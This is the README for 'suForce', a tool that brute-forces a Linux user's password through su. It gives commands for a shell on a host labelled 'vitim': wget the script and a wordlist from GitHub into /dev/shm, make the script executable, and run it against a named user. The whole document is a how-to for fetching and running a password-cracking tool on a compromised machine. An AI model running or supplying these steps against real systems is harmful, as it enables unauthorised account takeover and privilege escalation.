# suForce

**su Brute Force - User Password**

![](/screenshot.png)

- <kbd>Download</kbd>

```cmd
user@vitim:~$ cd /dev/shm
user@vitim:~$ wget -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/suForce.sh"
user@vitim:~$ wget -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/techyou.txt"
```

- <kbd>Use</kbd>

```cmd
user@vitim:~$ chmod +x suForce.sh
user@vitim:~$ ./suForce.sh -u <USER> -w <WORDLIST>
```

---
